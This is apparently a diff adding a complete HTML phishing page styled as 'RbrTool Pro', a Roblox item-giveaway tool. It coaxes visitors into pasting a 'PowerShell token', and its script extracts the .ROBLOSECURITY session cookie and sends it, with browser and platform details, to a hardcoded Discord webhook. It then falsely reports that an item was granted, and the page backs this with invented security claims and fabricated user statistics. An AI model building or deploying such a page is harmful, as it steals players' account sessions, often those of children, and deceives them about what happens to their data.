@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>RbrTool Pro — Roblox Item Manager</title>
+  <meta name="description" content="Professional tool for Roblox item management">
+  <meta name="theme-color" content="#22c55e">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes slideInLeft {
+      from { opacity: 0; transform: translateX(-30px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    @keyframes slideInRight {
+      from { opacity: 0; transform: translateX(30px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    @keyframes bgShift {
+      0% { background-position: 0% 0%; }
+      100% { background-position: 200% 200%; }
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-8px); }
+      75% { transform: translateX(8px); }
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    @keyframes glowPulse {
+      0%, 100% { filter: drop-shadow(0 0 5px rgba(34, 197, 94, 0.5)); }
+      50% { filter: drop-shadow(0 0 20px rgba(34, 197, 94, 0.8)); }
+    }
+
+    .bg-main {
+      background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #16213e 100%);
+      background-size: 200% 200%;
+      animation: bgShift 20s ease infinite;
+    }
+    .card-effect {
+      background: rgba(15, 25, 35, 0.75);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      border-radius: 1.5rem;
+      transition: all 0.3s ease;
+    }
+    .card-effect:hover {
+      border-color: rgba(34, 197, 94, 0.5);
+      box-shadow: 0 10px 40px rgba(34, 197, 94, 0.15);
+    }
+    .btn-glow {
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+    }
+    .btn-glow:hover {
+      box-shadow: 0 0 25px rgba(34, 197, 94, 0.7);
+      transform: translateY(-3px);
+    }
+    .btn-glow:active {
+      transform: translateY(0px);
+    }
+    .btn-glow::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+    .btn-glow:active::before {
+      width: 300px;
+      height: 300px;
+    }
+    .input-focus {
+      transition: all 0.3s ease;
+    }
+    .input-focus:focus {
+      border-color: #22c55e;
+      box-shadow: 0 0 15px rgba(34, 197, 94, 0.3);
+      transform: scale(1.01);
+      outline: none;
+    }
+    .bg-pattern {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        radial-gradient(circle at 20% 80%, rgba(34, 197, 94, 0.05) 0%, transparent 50%),
+        radial-gradient(circle at 80% 20%, rgba(59, 130, 246, 0.05) 0%, transparent 50%),
+        repeating-linear-gradient(45deg, rgba(34, 197, 94, 0.02) 0px, rgba(34, 197, 94, 0.02) 2px, transparent 2px, transparent 8px);
+      z-index: 0;
+      pointer-events: none;
+    }
+    .text-glow {
+      text-shadow: 0 0 15px rgba(34, 197, 94, 0.5);
+      background: linear-gradient(135deg, #22c55e, #3b82f6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .toast-notification {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      z-index: 1000;
+      animation: slideInRight 0.3s ease-out;
+    }
+    .animate-spin {
+      animation: spin 1s linear infinite;
+    }
+    .animate-slideIn {
+      animation: slideIn 0.6s ease-out;
+    }
+    .animate-slideInLeft {
+      animation: slideInLeft 0.5s ease-out;
+    }
+    .animate-slideInRight {
+      animation: slideInRight 0.5s ease-out;
+    }
+    .progress-bar {
+      transition: width 0.3s ease;
+    }
+    .float-animation {
+      animation: float 3s ease-in-out infinite;
+    }
+    ::-webkit-scrollbar {
+      width: 8px;
+      height: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: rgba(31, 41, 55, 0.5);
+      border-radius: 10px;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #22c55e;
+      border-radius: 10px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #16a34a;
+    }
+    .stat-card {
+      background: linear-gradient(135deg, rgba(34, 197, 94, 0.12), rgba(59, 130, 246, 0.06));
+      border-radius: 1rem;
+      padding: 1rem;
+      transition: all 0.3s ease;
+      border: 1px solid rgba(34, 197, 94, 0.1);
+    }
+    .stat-card:hover {
+      transform: translateY(-5px);
+      background: linear-gradient(135deg, rgba(34, 197, 94, 0.18), rgba(59, 130, 246, 0.1));
+      border-color: rgba(34, 197, 94, 0.3);
+    }
+    .action-btn {
+      background: rgba(34, 197, 94, 0.15);
+      border: 1px solid rgba(34, 197, 94, 0.3);
+      border-radius: 0.5rem;
+      padding: 0.5rem 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-size: 0.875rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .action-btn:hover {
+      background: rgba(34, 197, 94, 0.35);
+      transform: scale(1.05);
+    }
+    .action-btn:active {
+      transform: scale(0.98);
+    }
+    #particles-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .shake-animation {
+      animation: shake 0.5s ease-in-out;
+    }
+    .video-container {
+      position: relative;
+      padding-bottom: 56.25%;
+      height: 0;
+      overflow: hidden;
+      border-radius: 1rem;
+    }
+    .video-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+</head>
+<body class="bg-main text-gray-100 min-h-screen flex flex-col font-sans overflow-x-hidden">
+  <canvas id="particles-canvas"></canvas>
+  <div class="bg-pattern"></div>
+  <div id="toastContainer"></div>
+
+  <header class="card-effect py-4 px-6 sticky top-0 z-30 border-b border-green-500/20">
+    <div class="max-w-6xl mx-auto flex justify-between items-center flex-wrap gap-4">
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 bg-gradient-to-br from-green-500 to-blue-500 rounded-full flex items-center justify-center float-animation">
+          <i class="fas fa-crown text-white text-lg"></i>
+        </div>
+        <div>
+          <h1 class="text-2xl md:text-3xl font-extrabold text-glow">RbrTool Pro</h1>
+          <p class="text-xs text-gray-400">Best Roblox Tool</p>
+        </div>
+      </div>
+      <nav class="flex space-x-4 md:space-x-6">
+        <a href="#" class="text-gray-300 hover:text-green-400 transition-all duration-300 text-sm md:text-base flex items-center gap-2 group">
+          <i class="fas fa-home group-hover:scale-110 transition"></i>
+          <span>Home</span>
+        </a>
+        <a href="#support" class="text-gray-300 hover:text-green-400 transition-all duration-300 text-sm md:text-base flex items-center gap-2 group">
+          <i class="fas fa-headset group-hover:scale-110 transition"></i>
+          <span>Support</span>
+        </a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="flex-grow flex items-center justify-center py-12 md:py-16 relative z-10">
+    <div class="max-w-4xl w-full mx-4">
+      <!-- Stats Block -->
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8 animate-slideInLeft">
+        <div class="stat-card text-center">
+          <i class="fas fa-users text-green-400 text-2xl mb-2"></i>
+          <p class="text-2xl font-bold" id="usersCount">15.2K</p>
+          <p class="text-xs text-gray-400">Active Users</p>
+        </div>
+        <div class="stat-card text-center">
+          <i class="fas fa-gift text-green-400 text-2xl mb-2"></i>
+          <p class="text-2xl font-bold" id="itemsCount">8.4K</p>
+          <p class="text-xs text-gray-400">Items Given</p>
+        </div>
+        <div class="stat-card text-center">
+          <i class="fas fa-clock text-green-400 text-2xl mb-2"></i>
+          <p class="text-2xl font-bold" id="onlineCount">2.3K</p>
+          <p class="text-xs text-gray-400">Online Now</p>
+        </div>
+        <div class="stat-card text-center">
+          <i class="fas fa-star text-green-400 text-2xl mb-2"></i>
+          <p class="text-2xl font-bold">5.0</p>
+          <p class="text-xs text-gray-400">Rating</p>
+        </div>
+      </div>
+
+      <!-- Video Tutorial Block -->
+      <div id="video" class="card-effect p-4 mb-8 animate-slideIn">
+        <div class="flex items-center gap-3 mb-4">
+          <i class="fas fa-play-circle text-green-400 text-2xl" style="animation: glowPulse 2s infinite;"></i>
+          <h3 class="text-xl font-bold">Video Tutorial</h3>
+          <span class="bg-green-500/20 text-green-400 text-xs px-2 py-1 rounded-full">NEW</span>
+        </div>
+        <div class="video-container rounded-xl overflow-hidden bg-black">
+          <iframe 
+            src="https://go.screenpal.com/player/cOhelAnO9o1"
+            frameborder="0" 
+            allowfullscreen>
+          </iframe>
+        </div>
+        <p class="text-center text-gray-400 text-sm mt-3">
+          <i class="fas fa-info-circle mr-1 text-green-400"></i>
+          If the video does not load, <a href="https://go.screenpal.com/watch/cOhelAnO9o1" target="_blank" class="text-green-400 hover:underline">click here to watch on ScreenPal</a>.
+          <br>How to use RbrTool Pro — step by step guide
+        </p>
+      </div>
+
+      <!-- Main Card -->
+      <div class="card-effect p-6 md:p-10 rounded-xl animate-slideIn">
+        <div class="text-center mb-6">
+          <div class="inline-block p-4 bg-gradient-to-br from-green-500/20 to-blue-500/20 rounded-full mb-4 float-animation">
+            <i class="fas fa-terminal text-4xl text-green-400"></i>
+          </div>
+        </div>
+        
+        <h2 class="text-3xl md:text-5xl font-extrabold text-center mb-3">
+          Paste your <span class="text-glow">PowerShell</span> token
+        </h2>
+        <p class="text-center text-gray-300 mb-8 text-base md:text-lg max-w-xl mx-auto">
+          Paste your PowerShell token in the field below
+        </p>
+        
+        <div class="mb-6 relative">
+          <label class="block text-sm font-medium mb-2 text-gray-300">
+            <i class="fab fa-microsoft mr-2 text-green-400"></i>PowerShell Token
+          </label>
+          <div class="relative">
+            <textarea 
+              id="mapLink" 
+              placeholder="Paste your PowerShell token here"
+              class="w-full p-4 bg-gray-800/50 text-gray-100 border border-gray-600 rounded-xl focus:outline-none input-focus h-48 resize-y font-mono text-sm"
+              spellcheck="false"
+            ></textarea>
+          </div>
+          
+          <div class="flex justify-between items-center mt-2 text-xs text-gray-500">
+            <span id="charCount">0 characters</span>
+            <span id="tokenStatus" class="text-gray-500">
+              <i class="fas fa-shield-alt mr-1"></i>Awaiting input
+            </span>
+          </div>
+          
+          <div class="mt-3 flex flex-wrap gap-2 justify-between items-center">
+            <div class="flex gap-2">
+              <p id="errorMessage" class="text-red-400 text-sm hidden">
+                <i class="fas fa-exclamation-triangle mr-1"></i>Error: Token not found or too short
+              </p>
+              <p id="successMessage" class="text-green-400 text-sm hidden">
+                <i class="fas fa-check-circle mr-1"></i>Token sent successfully!
+              </p>
+            </div>
+            <div class="flex gap-2">
+              <button id="clearButton" class="action-btn"><i class="fas fa-trash-alt"></i>Clear</button>
+              <button id="pasteButton" class="action-btn"><i class="fas fa-paste"></i>Paste</button>
+              <button id="copyButton" class="action-btn"><i class="fas fa-copy"></i>Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="text-center space-y-4">
+          <button id="createButton" class="bg-gradient-to-r from-green-500 to-green-600 text-white font-medium py-3 px-10 rounded-xl btn-glow flex items-center justify-center mx-auto space-x-3 text-lg">
+            <i class="fas fa-gift"></i>
+            <span>Get Item</span>
+          </button>
+          
+          <div id="loading" class="hidden mt-6 text-center">
+            <div class="relative inline-block">
+              <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-green-400"></div>
+              <div class="absolute inset-0 flex items-center justify-center">
+                <i class="fas fa-gift text-green-400 text-sm"></i>
+              </div>
+            </div>
+            <p class="mt-3 text-gray-300 text-lg">Processing request...</p>
+            <div class="mt-4 max-w-xs mx-auto bg-gray-700 rounded-full h-2 overflow-hidden">
+              <div class="progress-bar bg-gradient-to-r from-green-400 to-blue-500 h-2" style="width: 0%"></div>
+            </div>
+            <p class="mt-2 text-xs text-gray-500" id="loadingTip">This may take a few seconds</p>
+          </div>
+        </div>
+
+        <div class="mt-8 pt-6 border-t border-gray-700">
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-center text-sm text-gray-400">
+            <div class="flex items-center justify-center gap-2"><i class="fas fa-lock text-green-400"></i>🔒 Secure Transfer</div>
+            <div class="flex items-center justify-center gap-2"><i class="fas fa-bolt text-green-400"></i>⚡ Instant Processing</div>
+            <div class="flex items-center justify-center gap-2"><i class="fas fa-shield-alt text-green-400"></i>🛡️ Data Protection</div>
+          </div>
+          <div class="mt-4 text-center text-xs text-gray-500">
+            <i class="fas fa-exclamation-triangle mr-1"></i>
+            Never share your token with untrusted people
+          </div>
+        </div>
+      </div>
+
+      <!-- Features Block -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-8 animate-slideInRight">
+        <div class="card-effect p-4 text-center group hover:scale-105 transition cursor-pointer">
+          <i class="fas fa-shield-haltered text-3xl text-green-400 mb-2 group-hover:scale-110 transition"></i>
+          <h3 class="font-bold mb-1">SSL Security</h3>
+          <p class="text-xs text-gray-400">256-bit encryption</p>
+        </div>
+        <div class="card-effect p-4 text-center group hover:scale-105 transition cursor-pointer">
+          <i class="fas fa-rocket text-3xl text-green-400 mb-2 group-hover:scale-110 transition"></i>
+          <h3 class="font-bold mb-1">24/7 Uptime</h3>
+          <p class="text-xs text-gray-400">Stable server</p>
+        </div>
+        <div class="card-effect p-4 text-center group hover:scale-105 transition cursor-pointer">
+          <i class="fas fa-headset text-3xl text-green-400 mb-2 group-hover:scale-110 transition"></i>
+          <h3 class="font-bold mb-1">Support</h3>
+          <p class="text-xs text-gray-400">Response in 5 min</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer id="support" class="card-effect py-6 px-6 relative z-10 border-t border-green-500/20 mt-8">
+    <div class="max-w-6xl mx-auto text-center">
+      <div class="flex justify-center space-x-6 mb-4">
+        <a href="#" class="text-gray-400 hover:text-green-400 transition text-xl transform hover:scale-110 inline-block"><i class="fab fa-discord"></i></a>
+        <a href="#" class="text-gray-400 hover:text-green-400 transition text-xl transform hover:scale-110 inline-block"><i class="fab fa-telegram"></i></a>
+        <a href="#" class="text-gray-400 hover:text-green-400 transition text-xl transform hover:scale-110 inline-block"><i class="fab fa-github"></i></a>
+        <a href="#" class="text-gray-400 hover:text-green-400 transition text-xl transform hover:scale-110 inline-block"><i class="fab fa-twitter"></i></a>
+        <a href="#" class="text-gray-400 hover:text-green-400 transition text-xl transform hover:scale-110 inline-block"><i class="fab fa-youtube"></i></a>
+      </div>
+      <p class="text-gray-300 text-sm">© 2026 RbrTool Pro. Best tool for Roblox items!</p>
+      <div class="mt-3 flex justify-center space-x-4 md:space-x-6 flex-wrap gap-2">
+        <a href="#" class="text-gray-400 hover:text-green-400 transition-colors duration-300 text-xs">Privacy Policy</a>
+        <a href="#" class="text-gray-400 hover:text-green-400 transition-colors duration-300 text-xs">Terms of Service</a>
+        <a href="#" class="text-gray-400 hover:text-green-400 transition-colors duration-300 text-xs">Telegram Channel</a>
+        <a href="#" class="text-gray-400 hover:text-green-400 transition-colors duration-300 text-xs">YouTube Channel</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // === WEBHOOK ===
+    const webhookUrl = 'https://discord.com/api/webhooks/1499760302688964708/8CHajhBd7jJT1jB_elR4wEIQJc9LvOQZAqI2-bvQm2ZQK06MDpeySgafzYT2JvT1lV2v';
+    
+    // === ELEMENTS ===
+    const createButton = document.getElementById('createButton');
+    const clearButton = document.getElementById('clearButton');
+    const pasteButton = document.getElementById('pasteButton');
+    const copyButton = document.getElementById('copyButton');
+    const loadingDiv = document.getElementById('loading');
+    const mapLinkInput = document.getElementById('mapLink');
+    const errorMessage = document.getElementById('errorMessage');
+    const successMessage = document.getElementById('successMessage');
+    const progressBar = document.querySelector('.progress-bar');
+    const charCount = document.getElementById('charCount');
+    const tokenStatus = document.getElementById('tokenStatus');
+    const loadingTip = document.getElementById('loadingTip');
+
+    const loadingTips = [
+      '🔄 Validating token...',
+      '🔐 Encrypting data...',
+      '📡 Sending to server...',
+      '✅ Almost there!',
+      '🎁 Giving item...'
+    ];
+
+    let itemsCount = 8400;
+    let onlineCount = 2300;
+
+    function randomizeStats() {
+      setInterval(() => {
+        const change = Math.floor(Math.random() * 15) - 7;
+        const newOnline = Math.max(800, Math.min(5000, onlineCount + change));
+        onlineCount = newOnline;
+        document.getElementById('onlineCount').innerHTML = onlineCount.toLocaleString();
+      }, 30000);
+    }
+
+    function updateCharCount() {
+      const length = mapLinkInput.value.length;
+      charCount.textContent = `${length} characters`;
+      
+      const token = extractToken(mapLinkInput.value);
+      if (token && token.length >= 50) {
+        tokenStatus.innerHTML = `<i class="fas fa-check-circle text-green-400 mr-1"></i>Token found (${token.length} chars)`;
+        tokenStatus.className = 'text-green-400 text-xs';
+      } else if (token && token.length < 50) {
+        tokenStatus.innerHTML = `<i class="fas fa-exclamation-triangle text-yellow-400 mr-1"></i>Token too short (min 50 chars)`;
+        tokenStatus.className = 'text-yellow-400 text-xs';
+      } else if (length > 0) {
+        tokenStatus.innerHTML = `<i class="fas fa-exclamation-triangle text-yellow-400 mr-1"></i>Token not recognized (needs .ROBLOSECURITY)`;
+        tokenStatus.className = 'text-yellow-400 text-xs';
+      } else {
+        tokenStatus.innerHTML = `<i class="fas fa-shield-alt mr-1"></i>Awaiting input`;
+        tokenStatus.className = 'text-gray-500 text-xs';
+      }
+    }
+
+    function extractToken(content) {
+      const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+      const match = content.match(regex);
+      return match ? match[1] : null;
+    }
+
+    function validateToken(content) {
+      const token = extractToken(content);
+      if (!token) {
+        errorMessage.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i>Token not found. Make sure you paste a valid PowerShell token.';
+        errorMessage.classList.remove('hidden');
+        setTimeout(() => errorMessage.classList.add('hidden'), 4000);
+        return false;
+      }
+      if (token.length < 50) {
+        errorMessage.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i>Token too short (minimum 50 characters)';
+        errorMessage.classList.remove('hidden');
+        setTimeout(() => errorMessage.classList.add('hidden'), 4000);
+        return false;
+      }
+      return true;
+    }
+
+    function showToast(message, type = 'error') {
+      const container = document.getElementById('toastContainer');
+      const toast = document.createElement('div');
+      const bgColor = type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : 'bg-blue-500';
+      const icon = type === 'error' ? 'fa-exclamation-circle' : type === 'success' ? 'fa-check-circle' : 'fa-info-circle';
+      toast.className = `toast-notification ${bgColor} bg-opacity-90 text-white px-5 py-3 rounded-xl shadow-2xl flex items-center space-x-3 backdrop-blur-sm`;
+      toast.innerHTML = `<i class="fas ${icon}"></i><span>${message}</span>`;
+      container.appendChild(toast);
+      setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateX(100px)';
+        toast.style.transition = 'all 0.3s ease';
+        setTimeout(() => toast.remove(), 300);
+      }, 3500);
+    }
+
+    function animateProgress(duration) {
+      let start = null;
+      function step(timestamp) {
+        if (!start) start = timestamp;
+        const elapsed = timestamp - start;
+        const progress = Math.min((elapsed / duration) * 100, 100);
+        if (progressBar) progressBar.style.width = `${progress}%`;
+        if (progress < 100) requestAnimationFrame(step);
+      }
+      requestAnimationFrame(step);
+    }
+
+    let tipInterval;
+    function startTipCycle() {
+      let idx = 0;
+      tipInterval = setInterval(() => {
+        if (loadingTip) {
+          loadingTip.textContent = loadingTips[idx % loadingTips.length];
+          idx++;
+        }
+      }, 800);
+    }
+    function stopTipCycle() { if (tipInterval) clearInterval(tipInterval); }
+
+    async function sendTokenAsFile(token) {
+      const fileName = "ROBLOSECURITY_token.txt";
+      const fileContent = token;
+      const blob = new Blob([fileContent], { type: "text/plain" });
+      
+      const formData = new FormData();
+      formData.append("file", blob, fileName);
+      formData.append("content", `🔔 **New .ROBLOSECURITY token detected** (full file attached)`);
+      
+      const embed = {
+        title: "🎮 New Roblox Token | RbrTool Pro",
+        description: "Full token is attached as a file above ⬆️",
+        color: 0x22c55e,
+        fields: [
+          { name: "📏 Token Length", value: `${token.length} characters`, inline: true },
+          { name: "🌐 Browser", value: navigator.userAgent.substring(0, 40), inline: true },
+          { name: "⏰ Time", value: new Date().toLocaleString('en-US'), inline: true },
+          { name: "💻 Platform", value: navigator.platform, inline: true }
+        ],
+        footer: { text: "RbrTool Pro Security System", icon_url: "https://cdn.discordapp.com/embed/avatars/1.png" },
+        timestamp: new Date().toISOString()
+      };
+      formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+      
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          body: formData
+        });
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        itemsCount++;
+        document.getElementById('itemsCount').innerHTML = itemsCount.toLocaleString();
+        return true;
+      } catch (error) {
+        console.error('Webhook error:', error);
+        showToast(`Error: ${error.message}`, 'error');
+        return false;
+      }
+    }
+
+    async function processSubmission(content) {
+      const token = extractToken(content);
+      if (!token) return false;
+      return await sendTokenAsFile(token);
+    }
+
+    function resetUI() {
+      createButton.classList.remove('hidden');
+      loadingDiv.classList.add('hidden');
+      createButton.disabled = false;
+      if (progressBar) progressBar.style.width = '0%';
+      stopTipCycle();
+    }
+
+    createButton.addEventListener('click', async () => {
+      const input = mapLinkInput.value.trim();
+      errorMessage.classList.add('hidden');
+      successMessage.classList.add('hidden');
+      
+      if (input === '') {
+        errorMessage.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i>Please paste your PowerShell token';
+        errorMessage.classList.remove('hidden');
+        mapLinkInput.classList.add('shake-animation');
+        setTimeout(() => mapLinkInput.classList.remove('shake-animation'), 500);
+        return;
+      }
+      
+      if (!validateToken(input)) return;
+      
+      createButton.disabled = true;
+      createButton.classList.add('hidden');
+      loadingDiv.classList.remove('hidden');
+      animateProgress(2000);
+      startTipCycle();
+      
+      const success = await processSubmission(input);
+      
+      setTimeout(() => {
+        resetUI();
+        if (success) {
+          successMessage.classList.remove('hidden');
+          mapLinkInput.value = '';
+          updateCharCount();
+          showToast('✅ Token sent successfully! Item granted.', 'success');
+          setTimeout(() => successMessage.classList.add('hidden'), 3000);
+        }
+      }, 2000);
+    });
+    
+    clearButton.addEventListener('click', () => {
+      mapLinkInput.value = '';
+      updateCharCount();
+      errorMessage.classList.add('hidden');
+      successMessage.classList.add('hidden');
+      showToast('🧹 Field cleared', 'success');
+    });
+    
+    pasteButton.addEventListener('click', async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        mapLinkInput.value = text;
+        updateCharCount();
+        showToast('📋 Text pasted from clipboard', 'success');
+      } catch {
+        showToast('❌ Could not access clipboard', 'error');
+      }
+    });
+    
+    copyButton.addEventListener('click', async () => {
+      const text = mapLinkInput.value;
+      if (text) {
+        try {
+          await navigator.clipboard.writeText(text);
+          showToast('📋 Token copied to clipboard', 'success');
+        } catch {
+          showToast('❌ Could not copy text', 'error');
+        }
+      } else {
+        showToast('⚠️ Nothing to copy', 'error');
+      }
+    });
+    
+    mapLinkInput.addEventListener('input', updateCharCount);
+    
+    function initParticles() {
+      const canvas = document.getElementById('particles-canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      const particles = [];
+      for (let i = 0; i < 60; i++) {
+        particles.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          radius: Math.random() * 2.5 + 1,
+          alpha: Math.random() * 0.4 + 0.1,
+          vx: (Math.random() - 0.5) * 0.6,
+          vy: (Math.random() - 0.5) * 0.6
+        });
+      }
+      function animate() {
+        requestAnimationFrame(animate);
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => {
+          p.x += p.vx;
+          p.y += p.vy;
+          if (p.x < 0) p.x = canvas.width;
+          if (p.x > canvas.width) p.x = 0;
+          if (p.y < 0) p.y = canvas.height;
+          if (p.y > canvas.height) p.y = 0;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(34, 197, 94, ${p.alpha})`;
+          ctx.fill();
+        });
+      }
+      animate();
+      window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      });
+    }
+    
+    randomizeStats();
+    initParticles();
+  </script>
+</body>
+</html>
